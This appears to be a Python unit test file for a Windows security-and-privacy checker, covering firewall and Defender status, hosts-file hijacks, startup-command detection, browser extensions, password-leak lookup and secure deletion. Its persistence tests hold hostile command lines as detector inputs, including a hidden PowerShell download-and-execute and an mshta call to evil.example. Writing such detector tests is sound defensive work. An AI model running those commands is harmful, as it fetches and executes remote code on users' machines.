import io
import os
import sys
import tempfile
import time
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import network_core as net  # noqa: E402
import privacy_core as privacy  # noqa: E402
import security_core as sec  # noqa: E402


class HealthTests(unittest.TestCase):
    def test_everything_good(self):
        data = {"firewall": [{"name": "Public", "enabled": True}], "defender": True, "realtime": True, "sig_age": 1,
                "uac": 1, "hotfix": time.strftime("%Y-%m-%d"), "bitlocker": [{"mount": "C:", "on": True}]}
        self.assertEqual({c.status for c in sec.evaluate_health(data)}, {sec.OK})

    def test_problems_are_found_with_fixes(self):
        data = {"firewall": [{"name": "Public", "enabled": False}, {"name": "Private", "enabled": True}],
                "defender": True, "realtime": False, "sig_age": 30, "uac": 0, "hotfix": "2020-01-01",
                "bitlocker": [{"mount": "C:", "on": False}]}
        checks = {c.title: c for c in sec.evaluate_health(data)}
        self.assertEqual(checks["Windows Firewall"].status, sec.BAD)
        self.assertIn("Public", checks["Windows Firewall"].detail)
        self.assertEqual(checks["Windows Firewall"].fix, "firewall")
        self.assertEqual(checks["Virus protection"].fix, "realtime")
        self.assertEqual(checks["Virus definitions"].fix, "signatures")
        self.assertEqual(checks["Admin approval prompts (UAC)"].fix, "uac")
        self.assertEqual(checks["Windows updates"].status, sec.BAD)
        self.assertEqual(checks["Drive encryption (BitLocker)"].status, sec.WARN)

    def test_single_item_values_from_powershell(self):
        checks = sec.evaluate_health({"firewall": {"name": "Domain", "enabled": True}, "defender": False})
        self.assertEqual(checks[0].status, sec.OK)


class HostsTests(unittest.TestCase):
    TEXT = ("# comment\n127.0.0.1 localhost\n::1 localhost\n"
            "93.184.216.34 www.paypal.com\n127.0.0.1 windowsupdate.microsoft.com\n"
            "0.0.0.0 ads.example.net\n10.9.9.9 intranet.corp\n")

    def test_judging(self):
        by_name = {e.names[0]: e for e in sec.parse_hosts(self.TEXT)}
        self.assertEqual(by_name["localhost"].level, sec.INFO)
        self.assertEqual(by_name["www.paypal.com"].level, sec.HIGH)
        self.assertEqual(by_name["windowsupdate.microsoft.com"].level, sec.HIGH)
        self.assertEqual(by_name["ads.example.net"].level, sec.LOW)
        self.assertEqual(by_name["intranet.corp"].level, sec.MEDIUM)

    def test_default_hosts_has_no_entries(self):
        self.assertEqual(sec.parse_hosts(sec.DEFAULT_HOSTS), [])

    def test_remove_and_write_keeps_backup(self):
        entries = sec.parse_hosts(self.TEXT)
        bad = [e.line_no for e in entries if e.level == sec.HIGH]
        cleaned = sec.remove_hosts_lines(self.TEXT, bad)
        self.assertNotIn("paypal", cleaned)
        self.assertIn("ads.example.net", cleaned)
        with tempfile.TemporaryDirectory() as folder:
            path = os.path.join(folder, "hosts")
            with open(path, "w") as f:
                f.write(self.TEXT)
            backup = sec.write_hosts(cleaned, path)
            self.assertEqual(open(backup).read(), self.TEXT)
            self.assertEqual(sec.read_hosts(path), cleaned)


class PersistenceTests(unittest.TestCase):
    def test_commands(self):
        self.assertEqual(sec.judge_command("powershell.exe -w hidden -enc SQBFAFgA")[0], sec.HIGH)
        self.assertEqual(sec.judge_command("powershell -NoP -W Hidden -c \"iex (New-Object Net.WebClient).DownloadString('http://x/a')\"")[0], sec.HIGH)
        self.assertEqual(sec.judge_command("mshta.exe https://evil.example/a.hta")[0], sec.HIGH)
        self.assertEqual(sec.judge_command(r"C:\Users\Me\AppData\Local\Temp\x.exe")[0], sec.MEDIUM)
        self.assertEqual(sec.judge_command(r"C:\Users\Me\Downloads\setup.exe /s")[0], sec.MEDIUM)
        self.assertEqual(sec.judge_command(r'"C:\Program Files\App\app.exe" --background')[0], sec.INFO)
        self.assertEqual(sec.judge_command("")[0], sec.INFO)

    def test_extract_exe(self):
        self.assertEqual(sec.extract_exe(r'"C:\Program Files\A\a.exe" -x'), r"C:\Program Files\A\a.exe")
        self.assertEqual(sec.extract_exe(r"C:\Tools\b.exe /silent"), r"C:\Tools\b.exe")

    def test_signature_verdicts(self):
        self.assertEqual(sec.judge_signature("HashMismatch", r"C:\x\a.exe")[0], sec.HIGH)
        self.assertEqual(sec.judge_signature("NotSigned", r"C:\Users\Me\Downloads\a.exe")[0], sec.MEDIUM)
        self.assertEqual(sec.judge_signature("NotSigned", r"C:\Tools\a.exe")[0], sec.INFO)
        self.assertEqual(sec.judge_signature("Valid", r"C:\Tools\a.exe")[0], sec.INFO)


class BrowserAndRemoteTests(unittest.TestCase):
    def test_extensions(self):
        broad = {"permissions": ["tabs", "cookies"], "host_permissions": ["<all_urls>"]}
        self.assertEqual(sec.judge_extension(broad)[0], sec.MEDIUM)
        self.assertEqual(sec.judge_extension({"permissions": ["proxy"]})[0], sec.MEDIUM)
        self.assertEqual(sec.judge_extension({"content_scripts": [{"matches": ["*://*/*"]}]})[0], sec.LOW)
        self.assertEqual(sec.judge_extension({"permissions": ["storage"]})[0], sec.INFO)

    def test_start_pages(self):
        self.assertEqual(sec.judge_start_pages(["https://www.google.com/"])[0], sec.INFO)
        self.assertEqual(sec.judge_start_pages(["http://search-the-web.example/"])[0], sec.MEDIUM)

    def test_remote_tools(self):
        self.assertEqual(sec.match_remote_tools(["explorer.exe", "AnyDesk.exe", "TeamViewer_Service.exe"]),
                         ["AnyDesk", "TeamViewer"])

    def test_read_extensions_from_folder(self):
        with tempfile.TemporaryDirectory() as base:
            ext = os.path.join(base, "Google", "Chrome", "User Data", "Default", "Extensions", "abc", "1.0")
            os.makedirs(ext)
            with open(os.path.join(ext, "manifest.json"), "w") as f:
                f.write('{"name": "Shady", "permissions": ["tabs", "history"], "host_permissions": ["<all_urls>"]}')
            found = sec.read_extensions(base)
            self.assertEqual([(f.browser, f.name, f.level) for f in found], [("Chrome", "Shady", sec.MEDIUM)])


class PrivacyTests(unittest.TestCase):
    def test_camera_entries(self):
        start = (1_700_000_000 * 10_000_000) + privacy._FILETIME_EPOCH
        entry = privacy.make_entry("C:#Users#me#app.exe", start, 0, "Allow")
        self.assertEqual(entry.app, r"C:\Users\me\app.exe")
        self.assertTrue(entry.in_use)
        self.assertAlmostEqual(entry.last_start, 1_700_000_000, delta=1)
        done = privacy.make_entry("Microsoft.WindowsCamera_8wekyb3d8bbwe", start, start + 10_000_000, "Deny")
        self.assertFalse(done.in_use)
        self.assertFalse(done.allowed)
        self.assertEqual(done.app, "Microsoft.WindowsCamera")

    def test_password_check_sends_only_a_prefix(self):
        prefix, suffix = privacy.hash_parts("password")
        self.assertEqual(prefix, "5BAA6")
        seen = []

        def fake_opener(request, timeout):
            seen.append(request.full_url)
            return io.BytesIO(f"0000000000000000000000000000000000A:2\r\n{suffix}:9545824\r\n".encode())

        self.assertEqual(privacy.leak_count("password", fake_opener), 9545824)
        self.assertEqual(seen, [privacy.PWNED_URL + "5BAA6"])
        self.assertEqual(privacy.count_in_range("ABC:1\n", "DEF"), 0)

    def test_strength_tips(self):
        self.assertTrue(privacy.strength_tips("123456"))
        self.assertEqual(privacy.strength_tips("correct-Horse-battery-staple-9!"), [])

    def test_secure_delete(self):
        with tempfile.TemporaryDirectory() as root:
            folder = os.path.join(root, "secret")
            os.makedirs(os.path.join(folder, "sub"))
            files = [os.path.join(folder, "a.txt"), os.path.join(folder, "sub", "b.bin")]
            for path in files:
                with open(path, "wb") as f:
                    f.write(b"top secret " * 5000)
            lone = os.path.join(root, "c.txt")
            with open(lone, "w") as f:
                f.write("x")
            done, problems = privacy.shred_paths([folder, lone], passes=2)
            self.assertEqual((done, problems), (3, []))
            self.assertEqual(os.listdir(root), [])

    def test_secure_delete_refuses_drive_roots_and_system_folders(self):
        with self.assertRaises(privacy.ShredError):
            privacy.shred_paths([os.path.abspath(os.sep)])
        if os.environ.get("SystemRoot"):
            with self.assertRaises(privacy.ShredError):
                privacy.shred_paths([os.path.join(os.environ["SystemRoot"], "System32", "x.dll")])


class NetworkExtraTests(unittest.TestCase):
    ROUTE = """
IPv4 Route Table
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0      192.168.1.1    192.168.1.23     25
          0.0.0.0          0.0.0.0      10.0.0.1       10.0.0.9        500
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
"""
    ARP = """
Interface: 192.168.1.23 --- 0x7
  Internet Address      Physical Address      Type
  192.168.1.1           aa-bb-cc-dd-ee-01     dynamic
  192.168.1.40          AA-BB-CC-DD-EE-40     dynamic
  192.168.1.255         ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
"""

    def test_route_and_arp(self):
        self.assertEqual(net.parse_route(self.ROUTE), ("192.168.1.1", "192.168.1.23"))
        self.assertEqual(net.parse_arp(self.ARP), [("192.168.1.1", "aa-bb-cc-dd-ee-01"),
                                                    ("192.168.1.40", "aa-bb-cc-dd-ee-40")])

    def test_attack_log_dedupes_within_an_hour(self):
        with tempfile.TemporaryDirectory() as folder:
            path = os.path.join(folder, "log.json")
            self.assertTrue(net.log_event("1.2.3.4", "scan", 7, path=path, now=1000))
            self.assertFalse(net.log_event("1.2.3.4", "scan", 8, path=path, now=1500))
            self.assertTrue(net.log_event("1.2.3.4", "scan", 9, path=path, now=1000 + 4000))
            self.assertTrue(net.log_event("1.2.3.4", "scan", 9, "blocked", path=path, now=1600))
            self.assertEqual(len(net.load_log(path)), 3)
            net.clear_log(path)
            self.assertEqual(net.load_log(path), [])


class FollowUpTests(unittest.TestCase):
    def test_country_lookup_only_sends_public_addresses(self):
        calls = []

        def opener(request, timeout):
            calls.append(request.full_url)
            return io.BytesIO(b'{"success": true, "country": "Germany", "country_code": "DE"}')

        self.assertEqual(net.country_for("93.184.216.34", opener), "Germany (DE)")
        self.assertEqual(len(calls), 1)
        self.assertIn("93.184.216.34", calls[0])
        for private in ("192.168.1.5", "10.0.0.2", "127.0.0.1", "not an ip"):
            self.assertIsNone(net.country_for(private, opener))
        self.assertEqual(len(calls), 1)  # nothing private was ever sent
        self.assertIsNone(net.parse_country('{"success": false}'))
        self.assertIsNone(net.parse_country("not json"))

    def test_country_is_added_to_the_log(self):
        with tempfile.TemporaryDirectory() as folder:
            path = os.path.join(folder, "log.json")
            net.log_event("93.184.216.34", "scan", 7, path=path, now=1000)
            net.set_log_country("93.184.216.34", "Germany (DE)", path)
            self.assertEqual(net.load_log(path)[0]["country"], "Germany (DE)")

    def test_router_page_is_described_without_logging_in(self):
        self.assertEqual(net.parse_router_page({"WWW-Authenticate": 'Basic realm="TP-Link Router"', "Server": "lighttpd"},
                                               "<html><title> Login </title>"),
                         "TP-Link Router | Login | lighttpd")
        self.assertEqual(net.parse_router_page({}, ""), "")
        self.assertEqual(net.router_identity(None), "")

    def test_drive_kinds(self):
        self.assertEqual(privacy.classify_drive("SSD", "SATA"), privacy.SSD)
        self.assertEqual(privacy.classify_drive("Unspecified", "NVMe"), privacy.SSD)
        self.assertEqual(privacy.classify_drive("HDD", "SATA"), privacy.HDD)
        self.assertEqual(privacy.classify_drive("HDD", "USB"), privacy.USB)
        self.assertEqual(privacy.classify_drive("", ""), privacy.UNKNOWN)
        self.assertEqual(privacy.drive_letters([r"C:\a.txt", r"c:\b\c.txt", r"D:\x"]), ["C", "D"])

    def test_tray_is_optional(self):
        import queue
        import tray
        real = tray.pystray
        tray.pystray = None
        try:
            t = tray.Tray(queue.Queue(), "none.ico", "Open", "Quit")
            self.assertFalse(t.available)
            self.assertFalse(t.start())
            t.notify("hello")
            t.stop()
        finally:
            tray.pystray = real


if __name__ == "__main__":
    unittest.main()
